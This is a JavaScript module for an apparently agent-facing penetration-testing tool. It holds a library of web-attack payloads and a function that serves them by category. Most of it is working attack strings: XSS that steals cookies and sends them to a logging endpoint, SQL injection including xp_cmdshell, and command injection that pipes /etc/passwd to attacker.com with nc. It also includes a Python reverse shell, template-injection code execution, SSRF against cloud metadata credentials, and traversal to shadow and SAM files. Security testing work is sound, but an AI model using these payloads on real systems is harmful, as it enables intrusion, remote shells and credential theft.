// ============================================================================
// Web-vulnerability DETECTION & ADVANCED PROBE LIBRARY (Critical Level)
// ============================================================================

/** @type {Record<string, string[]>} */
export const PAYLOADS = {
  // --- Advanced XSS & WAF Bypass Detection ---
  xss: [
    "<script>alert(9173)</script>",
    "<svg/onload=eval(atob('YWxlcnQoOTE3Myk='))>",
    "\"/><script>fetch('http://127.0.0.1:3003/log?c='+btoa(document.cookie))</script>",
    "<img src=x onerror=this.src='http://127.0.0.1:3003/log?c='+document.cookie>",
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(9173)>",
    "<details/open/ontoggle=alert(9173)>",
    "<iframe srcdoc=\"&lt;script&gt;parent.alert(9173)&lt;/script&gt;\"></iframe>",
    "<object data=\"javascript:alert(9173)\">",
  ],

  // --- Advanced SQLi (Stacked Queries, Time/Error-based, Blind) ---
  sqli: [
    "' UNION SELECT null,version(),user(),database()-- -",
    "' AND (SELECT 9173 FROM (SELECT(SLEEP(5)))a)-- -",
    "' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))-- -",
    "'; EXEC xp_cmdshell('id');-- -",
    "' UNION SELECT NULL,TABLE_NAME,NULL FROM information_schema.tables-- -",
    "admin' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
  ],

  // --- Remote Code Execution / Command Injection (Critical Level) ---
  command_injection: [
    "; cat /etc/passwd | nc attacker.com 4444",
    "`cat /sdcard/download/flag.txt`",
    "$(curl http://127.0.0.1:3003/exfil?data=$(whoami))",
    "& python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/sh\")' &",
    "; id; uname -a; cat /proc/version;",
  ],

  // --- SSTI / Code Execution via Template ---
  ssti: [
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    "#{T(java.lang.Runtime).getRuntime().exec('id')}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}",
  ],

  // --- Path Traversal & Sensitive File Exfiltration ---
  path_traversal: [
    "../../../../../../../../etc/shadow",
    "../../../../../../../../proc/self/environ",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..\\..\\..\\..\\..\\..\\windows\\system32\\config\\SAM",
    "/proc/self/cmdline",
  ],

  // --- SSRF & Cloud Metadata Exfiltration ---
  ssrf: [
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://127.0.0.1:6379/eval%20%22os.execute('id')%22%200",
    "gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20%2Froot%2F",
  ],

  // --- Deserialization & Injection Markers ---
  deserialization: [
    "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACAAFMAApncm91cERhdGF0AHJMTGphdmEvbGFuZy9TdHJpbmc7eHB0AAZhZG1pbg==",
    "O:4:\"User\":1:{s:4:\"name\";s:5:\"admin\";}",
  ],
};

import { CUSTOM_PAYLOADS } from "./custom.mjs";

/**
 * Merge the operator's custom payloads (custom.mjs) into the built-in set.
 * Robust to mistakes: non-string entries and blanks are dropped, duplicates
 * removed, so a typo in custom.mjs can never crash the engine. Custom entries
 * append after the built-ins within each category; brand-new categories appear
 * too. This runs at import time, so added payloads are live immediately.
 */
function mergeCustom(base, custom) {
  const out = {};
  for (const [cat, list] of Object.entries(base)) out[cat] = [...list];
  if (custom && typeof custom === "object") {
    for (const [cat, list] of Object.entries(custom)) {
      if (!Array.isArray(list)) continue;
      const clean = list.filter((p) => typeof p === "string" && p.trim() !== "");
      if (clean.length === 0 && !out[cat]) continue;
      out[cat] = [...(out[cat] ?? []), ...clean];
    }
  }
  for (const cat of Object.keys(out)) out[cat] = [...new Set(out[cat])];
  return out;
}

/** Built-in + custom payloads, merged. This is what the tool serves. */
export const ALL_PAYLOADS = mergeCustom(PAYLOADS, CUSTOM_PAYLOADS);

/** All category names (built-in + custom). */
export const CATEGORIES = Object.keys(ALL_PAYLOADS);

/** Total payload count across all categories. */
export const PAYLOAD_COUNT = Object.values(ALL_PAYLOADS).reduce((n, a) => n + a.length, 0);

/**
 * Fetch payloads for the agent. Read-only: returns strings, runs nothing.
 * @param {{ category?: string, limit?: number }} [opts]
 * @returns {{ ok: boolean, category: string, count: number, total: number, payloads?: string[], categories?: string[], message?: string }}
 */
export function getPayloads({ category, limit } = {}) {
  const cat = typeof category === "string" ? category.trim().toLowerCase() : "";
  const cap = Number.isInteger(limit) && limit > 0 ? limit : 50;

  if (!cat || cat === "all" || cat === "list") {
    return {
      ok: true,
      category: "list",
      count: CATEGORIES.length,
      total: PAYLOAD_COUNT,
      categories: CATEGORIES.map((c) => `${c} (${ALL_PAYLOADS[c].length})`),
      message: `Critical payload library: ${PAYLOAD_COUNT} advanced probes across ${CATEGORIES.length} categories. ` +
        `Authorized, in-scope testing only.`,
    };
  }

  const list = ALL_PAYLOADS[cat];
  if (!list) {
    return { ok: false, category: cat, count: 0, total: PAYLOAD_COUNT, message: `Unknown category "${cat}". Available: ${CATEGORIES.join(", ")}.` };
  }
  return { ok: true, category: cat, count: Math.min(cap, list.length), total: list.length, payloads: list.slice(0, cap) };
}